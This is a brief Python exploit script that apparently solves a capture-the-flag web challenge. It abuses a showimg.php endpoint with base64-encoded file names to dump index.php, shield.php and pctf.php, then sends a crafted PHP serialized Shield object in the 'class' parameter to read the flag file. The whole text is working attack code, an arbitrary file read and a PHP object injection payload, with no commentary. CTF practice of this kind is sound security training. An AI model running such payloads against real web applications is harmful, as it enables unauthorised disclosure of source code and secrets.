import base64
import requests


target = 'http://web.jarvisoj.com:32768/'
# print(requests.get(target).text)

# print(requests.get(target + 'showimg.php?img=c2hpZWxkLmpwZw==').text)

print('-----------------index.php-----------------')
print(requests.get(target + 'showimg.php?img=' + base64.b64encode('index.php'.encode()).decode()).text)

print('-----------------shield.php----------------')
print(requests.get(target + 'showimg.php?img=' + base64.b64encode('shield.php'.encode()).decode()).text)

print('-----------------pctf.php------------------')
print(requests.get(target + 'showimg.php?img=' + base64.b64encode('pctf.php'.encode()).decode()).text)

print('-------------------------------------------')

obj = 'O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}'
print(requests.get(target, params={'class': obj}).text)
